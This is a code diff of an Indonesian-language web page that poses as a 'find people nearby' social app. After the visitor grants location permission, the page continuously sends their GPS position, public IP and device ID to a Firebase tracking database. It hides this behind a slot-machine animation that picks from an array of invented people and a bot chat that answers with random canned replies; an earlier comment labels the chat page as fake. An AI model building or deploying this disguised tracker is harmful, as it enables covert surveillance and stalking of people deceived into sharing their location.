@@ -37,8 +37,6 @@
             justify-content: center;
             transition: all 0.4s;
         }
-
-        /* Discover Screen */
         .discover-screen, .slot-screen, .chat-screen {
             width: 100%;
             display: flex;
@@ -47,7 +45,6 @@
             gap: 24px;
         }
         .hidden { display: none !important; }
-
         .radar-icon {
             font-size: 70px;
             filter: drop-shadow(0 0 20px #7c3aed);
@@ -102,11 +99,7 @@
             color: #ddd;
             margin-top: 8px;
         }
-
-        /* Slot machine (animasi jackpot) */
-        .slot-screen {
-            justify-content: center;
-        }
+        .slot-screen { justify-content: center; }
         .slot-machine {
             background: rgba(0,0,0,0.5);
             border-radius: 28px;
@@ -150,8 +143,6 @@
             animation: spin 0.8s linear infinite;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        /* Hasil akhir di slot screen */
         .result-box {
             margin-top: 20px;
             padding: 16px;
@@ -163,8 +154,6 @@
             flex-direction: column;
             gap: 8px;
         }
-
-        /* Chat screen */
         .chat-screen {
             justify-content: flex-start;
             height: 100%;
@@ -266,7 +255,7 @@
 <body>
 <div class="container" id="mainContainer">
 
-    <!-- HALAMAN DISCOVER (AWAL) -->
+    <!-- HALAMAN DISCOVER -->
     <div id="discoverScreen" class="discover-screen">
         <div class="radar-icon">📡</div>
         <h1>Temukan Orang Sekitar</h1>
@@ -299,7 +288,7 @@
         </button>
     </div>
 
-    <!-- HALAMAN CHAT (PALSU) -->
+    <!-- HALAMAN CHAT -->
     <div id="chatScreen" class="chat-screen hidden">
         <div class="chat-header">
             <button class="back-btn" onclick="kembaliDariChat()"><i class="fas fa-arrow-left"></i></button>
@@ -324,15 +313,14 @@
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
     import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
 
-    // ⚠️ GANTI DENGAN URL FIREBASE KAMU
+    // 🔥 GANTI DENGAN URL REALTIME DATABASE KAMU
     const firebaseConfig = {
-        databaseURL: "https://lokaci-39db8-default-rtdb.asia-southeast1.firebasedatabase.app/"
+        databaseURL: "https://PROJECT_ID-default-rtdb.asia-southeast1.firebasedatabase.app"
     };
     const app = initializeApp(firebaseConfig);
     const db = getDatabase(app);
     const SECRET_ROOM = "yo";
 
-    // Device & IP
     let DEVICE_ID = localStorage.getItem('tracker_device_id');
     if (!DEVICE_ID) {
         DEVICE_ID = 'device_' + Math.random().toString(36).substr(2, 9);
@@ -342,7 +330,7 @@
     fetch('https://api.ipify.org?format=json')
         .then(r => r.json())
         .then(data => { publicIP = data.ip; })
-        .catch(() => {});
+        .catch(() => console.warn("Gagal ambil IP"));
 
     const deviceInfo = {
         deviceId: DEVICE_ID,
@@ -351,7 +339,6 @@
         ip: publicIP
     };
 
-    // State tracking
     let trackingActive = false;
     let watchId = null;
 
@@ -362,7 +349,9 @@
             return;
         }
         deviceInfo.ip = publicIP;
-        set(ref(db, `rooms/${SECRET_ROOM}/devices/${DEVICE_ID}/info`), deviceInfo);
+        set(ref(db, `rooms/${SECRET_ROOM}/devices/${DEVICE_ID}/info`), deviceInfo)
+            .catch(err => console.error("Gagal simpan info device:", err));
+        
         watchId = navigator.geolocation.watchPosition(
             (pos) => {
                 const { latitude, longitude } = pos.coords;
@@ -370,13 +359,14 @@
                     lat: latitude,
                     lng: longitude,
                     timestamp: Date.now()
-                });
+                }).catch(err => console.error("Gagal simpan posisi:", err));
             },
             (err) => console.warn("Tracking error:", err.message),
             { enableHighAccuracy: true, maximumAge: 5000, timeout: 8000 }
         );
         trackingActive = true;
-        document.getElementById('pulseDiscover').style.display = 'inline-block';
+        const pulseDot = document.getElementById('pulseDiscover');
+        if (pulseDot) pulseDot.style.display = 'inline-block';
         document.getElementById('statusDiscover').textContent = 'Lokasi kamu aktif';
     }
 
@@ -384,7 +374,6 @@
         if (watchId) navigator.geolocation.clearWatch(watchId);
     });
 
-    // Data orang palsu
     const fakePeople = [
         { name: "Rina Maulina", avatar: "👩", distance: 120 },
         { name: "Budi Santoso", avatar: "🧑", distance: 230 },
@@ -396,7 +385,6 @@
         { name: "Rudi Hartono", avatar: "👨‍🦱", distance: 280 },
     ];
 
-    // ========== SLOT MACHINE LOGIC ==========
     let slotInterval = null;
     let selectedPerson = null;
     let slotRunning = false;
@@ -406,13 +394,11 @@
         slotRunning = true;
         const nameEl = document.getElementById('slotName');
         const avatarEl = document.getElementById('avatarSlot');
-        let counter = 0;
-        // Ganti nama dan avatar dengan cepat
         slotInterval = setInterval(() => {
             const randomPerson = fakePeople[Math.floor(Math.random() * fakePeople.length)];
             nameEl.textContent = randomPerson.name;
             avatarEl.textContent = randomPerson.avatar;
-        }, 60); // kecepatan efek slot
+        }, 60);
     }
 
     function stopSlotMachine(person) {
@@ -422,14 +408,11 @@
         slotRunning = false;
         document.getElementById('slotName').textContent = person.name;
         document.getElementById('avatarSlot').textContent = person.avatar;
-        // Tampilkan hasil
-        const distance = Math.floor(Math.random() * 450) + 50; // 50-500 meter
+        const distance = Math.floor(Math.random() * 450) + 50;
         document.getElementById('resultText').innerHTML =
             `🎉 Kamu terhubung dengan <strong>${person.name}</strong>!<br>📍 Jarak sekitar <strong>${distance} meter</strong>`;
         document.getElementById('resultBox').classList.remove('hidden');
         document.getElementById('slotStatus').innerHTML = '<span style="color:#10b981;">●</span> <span>Tersambung</span>';
-
-        // Otomatis masuk chat setelah 2 detik
         setTimeout(() => {
             masukChat(person);
         }, 2000);
@@ -441,19 +424,16 @@
         document.getElementById('chatPartnerName').textContent = person.name;
         document.getElementById('chatAvatar').textContent = person.avatar;
         document.getElementById('chatMessages').innerHTML = '';
-        // Bot kirim pesan pembuka
         setTimeout(() => {
             tambahPesanDariLawan(`Hai! Kayaknya kita deketan nih, asik ngobrol bareng!`);
         }, 800);
     }
 
-    // ========== EVENT TOMBOL CARI ==========
     document.getElementById('btnFind').addEventListener('click', () => {
         const btn = document.getElementById('btnFind');
         btn.disabled = true;
         btn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Meminta izin...';
 
-        // Tampilkan slot screen
         document.getElementById('discoverScreen').classList.add('hidden');
         document.getElementById('slotScreen').classList.remove('hidden');
         document.getElementById('resultBox').classList.add('hidden');
@@ -462,10 +442,8 @@
         document.getElementById('slotName').textContent = '...';
         document.getElementById('avatarSlot').textContent = '👤';
 
-        // Mulai animasi slot dulu (terus berputar)
         startSlotMachine();
 
-        // Minta izin lokasi
         if (!navigator.geolocation) {
             setSlotError("Geolokasi tidak didukung");
             btn.disabled = false;
@@ -475,24 +453,18 @@
 
         navigator.geolocation.getCurrentPosition(
             (pos) => {
-                // Izin diberikan, mulai tracking
                 mulaiTracking();
-                // Pilih orang acak
                 selectedPerson = fakePeople[Math.floor(Math.random() * fakePeople.length)];
-                // Hentikan slot setelah sedikit delay biar dramatis
                 setTimeout(() => {
                     stopSlotMachine(selectedPerson);
-                }, 2000); // putar dulu 2 detik
-                // Update status tombol
+                }, 2000);
                 btn.disabled = false;
                 btn.innerHTML = '<i class="fas fa-search-location"></i> Cari Sekarang';
             },
             (err) => {
-                // Izin ditolak / error
                 setSlotError("Izin lokasi diperlukan. Coba lagi.");
                 btn.disabled = false;
                 btn.innerHTML = '<i class="fas fa-search-location"></i> Cari Sekarang';
-                // Tetap putar tanpa henti (animasi slot tetap berjalan)
                 document.getElementById('slotStatus').innerHTML = '<span style="color:#ef4444;">⚠️</span> <span>Izin lokasi ditolak</span>';
                 document.getElementById('btnRetry').classList.remove('hidden');
             },
@@ -505,7 +477,6 @@
         document.getElementById('btnRetry').classList.remove('hidden');
     }
 
-    // Tombol "Coba Lagi" mengembalikan ke discover screen
     window.resetToDiscover = function() {
         clearInterval(slotInterval);
         slotRunning = false;
@@ -513,30 +484,21 @@
         document.getElementById('discoverScreen').classList.remove('hidden');
     };
 
-    // Dari chat bisa kembali ke discover (dengan tracking tetap jalan)
     window.kembaliDariChat = function() {
         document.getElementById('chatScreen').classList.add('hidden');
         document.getElementById('discoverScreen').classList.remove('hidden');
     };
 
-    // ========== CHAT FUNGSI ==========
     window.kirimPesan = function() {
         const input = document.getElementById('chatInput');
         const teks = input.value.trim();
         if (!teks) return;
         tambahPesan(teks, 'sent');
         input.value = '';
-        // Balasan acak
         const balasanAcak = [
-            "Oh gitu ya, haha",
-            "Serius? Cerita dong",
-            "Wah keren juga",
-            "Sama dong, aku juga suka",
-            "Hmm, nggak nyangka",
-            "Kita deket banget loh ternyata",
-            "Jadi penasaran",
-            "Iya ya, bener banget",
-            "Ngomong-ngomong, lagi ngapain?",
+            "Oh gitu ya, haha", "Serius? Cerita dong", "Wah keren juga",
+            "Sama dong, aku juga suka", "Hmm, nggak nyangka", "Kita deket banget loh ternyata",
+            "Jadi penasaran", "Iya ya, bener banget", "Ngomong-ngomong, lagi ngapain?"
         ];
         setTimeout(() => {
             const balasan = balasanAcak[Math.floor(Math.random() * balasanAcak.length)];
